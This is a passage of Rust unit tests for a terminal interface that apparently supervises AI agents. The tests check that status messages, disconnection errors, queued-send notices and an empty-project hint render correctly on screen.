        assert!(f.state.input_target_missing());
        let text = screen(&draw(&f.state, 120, 30));
        assert!(
            text.contains("no target \u{2014} select an agent"),
            "{text}"
        );
        assert!(!text.contains(PERMISSION_HINT), "{text}");
        assert!(text.contains("half typed"), "text is kept\n{text}");
    }

    #[test]
    fn tree_focus_with_nothing_selected_says_so() {
        let f = Fx::new();
        let text = screen(&draw(&f.state, 120, 30));
        assert!(text.contains("select an agent"), "{text}");
    }

    #[test]
    fn disconnected_and_error_show_in_status() {
        let mut f = Fx::new();
        update(
            &mut f.state,
            AppEvent::Connection(crate::tui::ConnectionState::Disconnected {
                reason: "socket closed".to_owned(),
            }),
        );
        f.state.status.error = Some("boom".to_owned());
        let text = screen(&draw(&f.state, 120, 30));
        assert!(text.contains("daemon disconnected"), "{text}");
        assert!(text.contains("socket closed"), "{text}");
        assert!(text.contains("boom"), "{text}");
    }

    #[test]
    fn a_queued_send_shows_in_the_status_line() {
        let mut f = Fx::new();
        update(
            &mut f.state,
            AppEvent::RpcDone {
                request: RequestTag::Send {
                    agent_id: AgentId::generate(),
                    behavior: SendBehavior::Queue,
                },
                result: Ok(serde_json::json!({"outcome": "queued"})),
            },
        );
        let text = screen(&draw(&f.state, 120, 30));
        assert!(
            text.contains("queued \u{2014} delivered when the turn ends"),
            "{text}"
        );
    }

    /// The tree pane's text (inside its border) at 120 columns, whitespace
    /// removed (the hint wraps).
    fn tree_pane(buffer: &Buffer) -> String {
        rows(buffer)
            .iter()
            .flat_map(|r| r.chars().skip(1).take(34).collect::<Vec<_>>())
            .filter(|c| !c.is_whitespace())
            .collect()
    }

    #[test]
    fn an_empty_tree_says_how_to_add_a_project() {
        let hint: String = "no projects \u{2014} add one with: dgc project add <path>"
            .chars()
            .filter(|c| !c.is_whitespace())
            .collect();
        let state = AppState::default();
        let pane = tree_pane(&draw(&state, 120, 30));
        assert!(pane.contains(&hint), "{pane}");
        let f = Fx::new();
        let pane = tree_pane(&draw(&f.state, 120, 30));
        assert!(!pane.contains("noprojects"), "{pane}");
    }
}
